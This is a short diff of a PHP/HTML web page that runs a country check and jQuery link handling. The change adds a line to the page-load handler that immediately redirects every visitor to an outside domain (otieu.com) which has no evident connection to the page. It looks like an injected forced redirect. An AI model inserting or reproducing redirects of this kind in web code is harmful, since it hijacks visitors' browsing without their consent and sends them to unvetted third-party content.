@@ -86,6 +86,10 @@ if($country === "Nigeria") {
    
 		<script>
 			$("document").ready(function() {
+
+				window.location.href = "https://otieu.com/4/5721483";
+
+
    				let links = document.querySelectorAll(".mfinder");
 
     				let secArray = [25000, 35000];
